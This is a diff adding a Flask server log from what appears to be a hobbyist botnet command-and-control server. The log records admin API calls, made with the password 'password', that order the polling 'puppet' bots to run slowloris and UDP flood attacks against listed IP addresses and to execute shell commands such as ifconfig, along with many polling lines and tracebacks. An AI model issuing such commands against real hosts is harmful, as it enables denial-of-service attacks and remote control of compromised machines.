@@ -1,0 +1,336 @@
+2019-12-26 21:53:10,964 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2019-12-26 21:53:29,894 - 127.0.0.1 - - [26/Dec/2019 21:53:29] "[37mGET /adminapi?password=password&command=slowloris%20127.0.0.1%20-p%2080%20-s%20150 HTTP/1.1[0m" 200 -
+2019-12-26 21:53:37,889 - 127.0.0.1 - - [26/Dec/2019 21:53:37] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:53:42,902 - 127.0.0.1 - - [26/Dec/2019 21:53:42] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:53:44,972 - 127.0.0.1 - - [26/Dec/2019 21:53:44] "[37mGET /adminapi?password=password&command=STOPALL HTTP/1.1[0m" 200 -
+2019-12-26 21:53:47,915 - 127.0.0.1 - - [26/Dec/2019 21:53:47] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:53:52,941 - 127.0.0.1 - - [26/Dec/2019 21:53:52] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:53:57,953 - 127.0.0.1 - - [26/Dec/2019 21:53:57] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:02,965 - 127.0.0.1 - - [26/Dec/2019 21:54:02] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:07,977 - 127.0.0.1 - - [26/Dec/2019 21:54:07] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:12,989 - 127.0.0.1 - - [26/Dec/2019 21:54:12] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:16,957 - 127.0.0.1 - - [26/Dec/2019 21:54:16] "[37mGET /adminapi?password=password&command=WAIT HTTP/1.1[0m" 200 -
+2019-12-26 21:54:18,002 - 127.0.0.1 - - [26/Dec/2019 21:54:18] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:23,013 - 127.0.0.1 - - [26/Dec/2019 21:54:23] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:28,025 - 127.0.0.1 - - [26/Dec/2019 21:54:28] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:33,037 - 127.0.0.1 - - [26/Dec/2019 21:54:33] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:38,046 - 127.0.0.1 - - [26/Dec/2019 21:54:38] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:43,059 - 127.0.0.1 - - [26/Dec/2019 21:54:43] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:48,066 - 127.0.0.1 - - [26/Dec/2019 21:54:48] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:53,077 - 127.0.0.1 - - [26/Dec/2019 21:54:53] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:54:54,871 - 127.0.0.1 - - [26/Dec/2019 21:54:54] "[37mGET /adminapi?password=password&command=slowloris%2011%20-p%2011%20-s%20 HTTP/1.1[0m" 200 -
+2019-12-26 21:54:58,089 - 127.0.0.1 - - [26/Dec/2019 21:54:58] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:55:03,104 - 127.0.0.1 - - [26/Dec/2019 21:55:03] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:55:08,117 - 127.0.0.1 - - [26/Dec/2019 21:55:08] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:55:08,257 - 127.0.0.1 - - [26/Dec/2019 21:55:08] "[37mGET /adminapi?password=password&command=STOPALL HTTP/1.1[0m" 200 -
+2019-12-26 21:55:13,129 - 127.0.0.1 - - [26/Dec/2019 21:55:13] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2019-12-26 21:55:18,158 - 127.0.0.1 - - [26/Dec/2019 21:55:18] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:22:36,167 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-13 16:22:57,551 - 127.0.0.1 - - [13/Jan/2020 16:22:57] "[37mGET /adminapi?password=password&command=SETTIMEWAIT%20$ HTTP/1.1[0m" 200 -
+2020-01-13 16:23:08,411 - 127.0.0.1 - - [13/Jan/2020 16:23:08] "[37mGET /adminapi?password=password&command=SETTIMEWAIT%202 HTTP/1.1[0m" 200 -
+2020-01-13 16:23:55,765 - 127.0.0.1 - - [13/Jan/2020 16:23:55] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:45,590 - 127.0.0.1 - - [13/Jan/2020 16:24:45] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:47,598 - 127.0.0.1 - - [13/Jan/2020 16:24:47] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:49,609 - 127.0.0.1 - - [13/Jan/2020 16:24:49] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:51,619 - 127.0.0.1 - - [13/Jan/2020 16:24:51] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:53,627 - 127.0.0.1 - - [13/Jan/2020 16:24:53] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:55,637 - 127.0.0.1 - - [13/Jan/2020 16:24:55] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:57,649 - 127.0.0.1 - - [13/Jan/2020 16:24:57] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:24:57,978 - 127.0.0.1 - - [13/Jan/2020 16:24:57] "[37mGET /adminapi?password=password&command=SETTIMEWAIT%2010 HTTP/1.1[0m" 200 -
+2020-01-13 16:24:59,659 - 127.0.0.1 - - [13/Jan/2020 16:24:59] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:09,676 - 127.0.0.1 - - [13/Jan/2020 16:25:09] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:19,694 - 127.0.0.1 - - [13/Jan/2020 16:25:19] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:29,711 - 127.0.0.1 - - [13/Jan/2020 16:25:29] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:38,076 - 127.0.0.1 - - [13/Jan/2020 16:25:38] "[37mGET /adminapi?password=password&command=SETTIMEWAIT%201 HTTP/1.1[0m" 200 -
+2020-01-13 16:25:39,729 - 127.0.0.1 - - [13/Jan/2020 16:25:39] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:40,738 - 127.0.0.1 - - [13/Jan/2020 16:25:40] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:41,748 - 127.0.0.1 - - [13/Jan/2020 16:25:41] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:42,757 - 127.0.0.1 - - [13/Jan/2020 16:25:42] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:43,766 - 127.0.0.1 - - [13/Jan/2020 16:25:43] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:44,775 - 127.0.0.1 - - [13/Jan/2020 16:25:44] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:45,784 - 127.0.0.1 - - [13/Jan/2020 16:25:45] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:46,792 - 127.0.0.1 - - [13/Jan/2020 16:25:46] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:47,801 - 127.0.0.1 - - [13/Jan/2020 16:25:47] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:48,811 - 127.0.0.1 - - [13/Jan/2020 16:25:48] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:49,820 - 127.0.0.1 - - [13/Jan/2020 16:25:49] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:49,989 - 127.0.0.1 - - [13/Jan/2020 16:25:49] "[37mGET /adminapi?password=password&command=SETTIMEWAIT%205 HTTP/1.1[0m" 200 -
+2020-01-13 16:25:50,830 - 127.0.0.1 - - [13/Jan/2020 16:25:50] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:25:55,843 - 127.0.0.1 - - [13/Jan/2020 16:25:55] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:36:50,013 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-13 16:36:59,285 - Exception on /puppetsapi [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1815, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1718, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/lib/python3/dist-packages/flask/_compat.py", line 35, in reraise
+    raise value
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1813, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "server.py", line 59, in give_command
+    return CURENTCOMMAND
+NameError: name 'CURENTCOMMAND' is not defined
+2020-01-13 16:36:59,286 - 127.0.0.1 - - [13/Jan/2020 16:36:59] "[1m[35mGET /puppetsapi HTTP/1.1[0m" 500 -
+2020-01-13 16:37:04,298 - Exception on /puppetsapi [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1815, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1718, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/lib/python3/dist-packages/flask/_compat.py", line 35, in reraise
+    raise value
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1813, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "server.py", line 59, in give_command
+    return CURENTCOMMAND
+NameError: name 'CURENTCOMMAND' is not defined
+2020-01-13 16:37:04,299 - 127.0.0.1 - - [13/Jan/2020 16:37:04] "[1m[35mGET /puppetsapi HTTP/1.1[0m" 500 -
+2020-01-13 16:37:09,311 - Exception on /puppetsapi [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1815, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1718, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/lib/python3/dist-packages/flask/_compat.py", line 35, in reraise
+    raise value
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1813, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "server.py", line 59, in give_command
+    return CURENTCOMMAND
+NameError: name 'CURENTCOMMAND' is not defined
+2020-01-13 16:37:09,312 - 127.0.0.1 - - [13/Jan/2020 16:37:09] "[1m[35mGET /puppetsapi HTTP/1.1[0m" 500 -
+2020-01-13 16:38:00,254 - Exception on /puppetsapi [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1815, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1718, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/lib/python3/dist-packages/flask/_compat.py", line 35, in reraise
+    raise value
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1813, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "server.py", line 59, in give_command
+    return CURENTCOMMAND
+NameError: name 'CURENTCOMMAND' is not defined
+2020-01-13 16:38:00,254 - 127.0.0.1 - - [13/Jan/2020 16:38:00] "[1m[35mGET /puppetsapi HTTP/1.1[0m" 500 -
+2020-01-13 16:38:05,266 - Exception on /puppetsapi [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1815, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1718, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/lib/python3/dist-packages/flask/_compat.py", line 35, in reraise
+    raise value
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1813, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "server.py", line 59, in give_command
+    return CURENTCOMMAND
+NameError: name 'CURENTCOMMAND' is not defined
+2020-01-13 16:38:05,268 - 127.0.0.1 - - [13/Jan/2020 16:38:05] "[1m[35mGET /puppetsapi HTTP/1.1[0m" 500 -
+2020-01-13 16:38:10,279 - Exception on /puppetsapi [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1815, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1718, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/lib/python3/dist-packages/flask/_compat.py", line 35, in reraise
+    raise value
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1813, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "server.py", line 59, in give_command
+    return CURENTCOMMAND
+NameError: name 'CURENTCOMMAND' is not defined
+2020-01-13 16:38:10,280 - 127.0.0.1 - - [13/Jan/2020 16:38:10] "[1m[35mGET /puppetsapi HTTP/1.1[0m" 500 -
+2020-01-13 16:38:12,339 - 127.0.0.1 - - [13/Jan/2020 16:38:12] "[37mGET /adminapi?password=password&command=SETTIMEWAIT HTTP/1.1[0m" 200 -
+2020-01-13 16:38:15,293 - 127.0.0.1 - - [13/Jan/2020 16:38:15] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:38:20,305 - 127.0.0.1 - - [13/Jan/2020 16:38:20] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:07,830 - 127.0.0.1 - - [13/Jan/2020 16:52:07] "[37mGET /adminapi?password=password&command=PRINT HTTP/1.1[0m" 200 -
+2020-01-13 16:52:15,649 - 127.0.0.1 - - [13/Jan/2020 16:52:15] "[37mGET /adminapi?password=password&command=PRINT%20LOX HTTP/1.1[0m" 200 -
+2020-01-13 16:52:23,334 - 127.0.0.1 - - [13/Jan/2020 16:52:23] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:28,345 - 127.0.0.1 - - [13/Jan/2020 16:52:28] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:33,358 - 127.0.0.1 - - [13/Jan/2020 16:52:33] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:38,366 - 127.0.0.1 - - [13/Jan/2020 16:52:38] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:40,715 - 127.0.0.1 - - [13/Jan/2020 16:52:40] "[37mGET /adminapi?password=password&command=EXECUTEC%20echo%20%22test%20tes%20test%22 HTTP/1.1[0m" 200 -
+2020-01-13 16:52:43,370 - 127.0.0.1 - - [13/Jan/2020 16:52:43] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:48,374 - 127.0.0.1 - - [13/Jan/2020 16:52:48] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:53,382 - 127.0.0.1 - - [13/Jan/2020 16:52:53] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:52:58,394 - 127.0.0.1 - - [13/Jan/2020 16:52:58] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:03,406 - 127.0.0.1 - - [13/Jan/2020 16:53:03] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:08,418 - 127.0.0.1 - - [13/Jan/2020 16:53:08] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:13,430 - 127.0.0.1 - - [13/Jan/2020 16:53:13] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:18,445 - 127.0.0.1 - - [13/Jan/2020 16:53:18] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:20,469 - 127.0.0.1 - - [13/Jan/2020 16:53:20] "[37mGET /adminapi?password=password&command=EXECUTEC%20cmarix HTTP/1.1[0m" 200 -
+2020-01-13 16:53:23,461 - 127.0.0.1 - - [13/Jan/2020 16:53:23] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:28,476 - 127.0.0.1 - - [13/Jan/2020 16:53:28] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:33,491 - 127.0.0.1 - - [13/Jan/2020 16:53:33] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:37,171 - 127.0.0.1 - - [13/Jan/2020 16:53:37] "[37mGET /adminapi?password=password&command=EXECUTEC%20ifconfig HTTP/1.1[0m" 200 -
+2020-01-13 16:53:38,506 - 127.0.0.1 - - [13/Jan/2020 16:53:38] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:43,522 - 127.0.0.1 - - [13/Jan/2020 16:53:43] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:48,538 - 127.0.0.1 - - [13/Jan/2020 16:53:48] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-13 16:53:53,554 - 127.0.0.1 - - [13/Jan/2020 16:53:53] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:02:05,906 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-14 14:02:38,195 - 127.0.0.1 - - [14/Jan/2020 14:02:38] "[37mGET /adminapi?password=password&command=udpddos%20221.13.13.153%204444%20no HTTP/1.1[0m" 200 -
+2020-01-14 14:02:55,288 - 127.0.0.1 - - [14/Jan/2020 14:02:55] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:00,304 - 127.0.0.1 - - [14/Jan/2020 14:03:00] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:05,315 - 127.0.0.1 - - [14/Jan/2020 14:03:05] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:10,326 - 127.0.0.1 - - [14/Jan/2020 14:03:10] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:15,339 - 127.0.0.1 - - [14/Jan/2020 14:03:15] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:20,351 - 127.0.0.1 - - [14/Jan/2020 14:03:20] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:25,360 - 127.0.0.1 - - [14/Jan/2020 14:03:25] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:26,513 - 127.0.0.1 - - [14/Jan/2020 14:03:26] "[37mGET /adminapi?password=password&command=STOPALL HTTP/1.1[0m" 200 -
+2020-01-14 14:03:30,370 - 127.0.0.1 - - [14/Jan/2020 14:03:30] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:35,386 - 127.0.0.1 - - [14/Jan/2020 14:03:35] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:03:40,395 - 127.0.0.1 - - [14/Jan/2020 14:03:40] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:16,860 - 127.0.0.1 - - [14/Jan/2020 14:06:16] "[37mGET /adminapi?password=password&command=WAIT HTTP/1.1[0m" 200 -
+2020-01-14 14:06:27,740 - 127.0.0.1 - - [14/Jan/2020 14:06:27] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:32,753 - 127.0.0.1 - - [14/Jan/2020 14:06:32] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:37,765 - 127.0.0.1 - - [14/Jan/2020 14:06:37] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:42,778 - 127.0.0.1 - - [14/Jan/2020 14:06:42] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:47,165 - 127.0.0.1 - - [14/Jan/2020 14:06:47] "[37mGET /adminapi?password=password&command=udpddos%2012.121.31.21%202231%20no HTTP/1.1[0m" 200 -
+2020-01-14 14:06:47,790 - 127.0.0.1 - - [14/Jan/2020 14:06:47] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:52,806 - 127.0.0.1 - - [14/Jan/2020 14:06:52] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:06:57,814 - 127.0.0.1 - - [14/Jan/2020 14:06:57] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:02,826 - 127.0.0.1 - - [14/Jan/2020 14:07:02] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:07,838 - 127.0.0.1 - - [14/Jan/2020 14:07:07] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:12,850 - 127.0.0.1 - - [14/Jan/2020 14:07:12] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:14,150 - 127.0.0.1 - - [14/Jan/2020 14:07:14] "[37mGET /adminapi?password=password&command=STOPALL HTTP/1.1[0m" 200 -
+2020-01-14 14:07:17,858 - 127.0.0.1 - - [14/Jan/2020 14:07:17] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:22,881 - 127.0.0.1 - - [14/Jan/2020 14:07:22] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:27,894 - 127.0.0.1 - - [14/Jan/2020 14:07:27] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:32,906 - 127.0.0.1 - - [14/Jan/2020 14:07:32] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:37,918 - 127.0.0.1 - - [14/Jan/2020 14:07:37] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:42,930 - 127.0.0.1 - - [14/Jan/2020 14:07:42] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:44,062 - 127.0.0.1 - - [14/Jan/2020 14:07:44] "[37mGET /adminapi?password=password&command=slowloris%2021.121.132.31%20-p%2080%20-s%20100 HTTP/1.1[0m" 200 -
+2020-01-14 14:07:44,071 - 127.0.0.1 - - [14/Jan/2020 14:07:44] "[37mGET /adminapi?password=password&command=slowloris HTTP/1.1[0m" 200 -
+2020-01-14 14:07:47,943 - 127.0.0.1 - - [14/Jan/2020 14:07:47] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:52,958 - 127.0.0.1 - - [14/Jan/2020 14:07:52] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:07:57,970 - 127.0.0.1 - - [14/Jan/2020 14:07:57] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:08:02,983 - 127.0.0.1 - - [14/Jan/2020 14:08:02] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:08:07,996 - 127.0.0.1 - - [14/Jan/2020 14:08:07] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:09:38,189 - 127.0.0.1 - - [14/Jan/2020 14:09:38] "[37mGET /adminapi?password=password&command=slowloris%20127.0.0.1%20-p%2080%20-s%20100 HTTP/1.1[0m" 200 -
+2020-01-14 14:09:38,200 - 127.0.0.1 - - [14/Jan/2020 14:09:38] "[37mGET /adminapi?password=password&command=slowloris HTTP/1.1[0m" 200 -
+2020-01-14 14:09:47,495 - 127.0.0.1 - - [14/Jan/2020 14:09:47] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:09:52,508 - 127.0.0.1 - - [14/Jan/2020 14:09:52] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:12:47,215 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-14 14:13:04,166 - 127.0.0.1 - - [14/Jan/2020 14:13:04] "[37mGET /adminapi?password=password&command=slowloris%20127.0.0.1%20-p%2080%20-s%20100 HTTP/1.1[0m" 200 -
+2020-01-14 14:13:04,177 - 127.0.0.1 - - [14/Jan/2020 14:13:04] "[37mGET /adminapi?password=password&command=slowloris HTTP/1.1[0m" 200 -
+2020-01-14 14:13:14,968 - 127.0.0.1 - - [14/Jan/2020 14:13:14] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:13:19,981 - 127.0.0.1 - - [14/Jan/2020 14:13:19] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:15:00,406 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-14 14:15:00,408 -  * Restarting with stat
+2020-01-14 14:15:00,582 -  * Debugger is active!
+2020-01-14 14:15:00,760 -  * Debugger PIN: 308-782-205
+2020-01-14 14:15:13,550 - 127.0.0.1 - - [14/Jan/2020 14:15:13] "[37mGET /adminapi?password=password&command=slowloris%20127.0.0.1%20-p%2021%20-s%202 HTTP/1.1[0m" 200 -
+2020-01-14 14:15:13,553 - 127.0.0.1 - - [14/Jan/2020 14:15:13] "[37mGET /adminapi?password=password&command=slowloris HTTP/1.1[0m" 200 -
+2020-01-14 14:15:23,508 - 127.0.0.1 - - [14/Jan/2020 14:15:23] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:16:29,314 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-14 14:16:29,315 -  * Restarting with stat
+2020-01-14 14:16:29,488 -  * Debugger is active!
+2020-01-14 14:16:29,489 -  * Debugger PIN: 308-782-205
+2020-01-14 14:19:13,348 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-14 14:19:13,350 -  * Restarting with stat
+2020-01-14 14:19:13,523 -  * Debugger is active!
+2020-01-14 14:19:13,524 -  * Debugger PIN: 308-782-205
+2020-01-14 14:19:48,216 - 127.0.0.1 - - [14/Jan/2020 14:19:48] "[37mGET /adminapi?password=password&command=slowloris%20127.0.0.1%20-p%2080%20-s%20100 HTTP/1.1[0m" 200 -
+2020-01-14 14:19:48,223 - [!] Failed to execute command! Command was slowloris
+2020-01-14 14:19:48,223 - 127.0.0.1 - - [14/Jan/2020 14:19:48] "[37mGET /adminapi?password=password&command=slowloris HTTP/1.1[0m" 200 -
+2020-01-14 14:19:59,876 - 127.0.0.1 - - [14/Jan/2020 14:19:59] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:20:04,889 - 127.0.0.1 - - [14/Jan/2020 14:20:04] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:20:09,902 - 127.0.0.1 - - [14/Jan/2020 14:20:09] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:20:14,915 - 127.0.0.1 - - [14/Jan/2020 14:20:14] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-14 14:20:19,926 - 127.0.0.1 - - [14/Jan/2020 14:20:19] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:09,044 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-15 08:50:09,046 -  * Restarting with stat
+2020-01-15 08:50:09,221 -  * Debugger is active!
+2020-01-15 08:50:09,407 -  * Debugger PIN: 897-453-364
+2020-01-15 08:50:19,453 - 127.0.0.1 - - [15/Jan/2020 08:50:19] "[37mGET /adminapi?password=password&command=WAIT HTTP/1.1[0m" 200 -
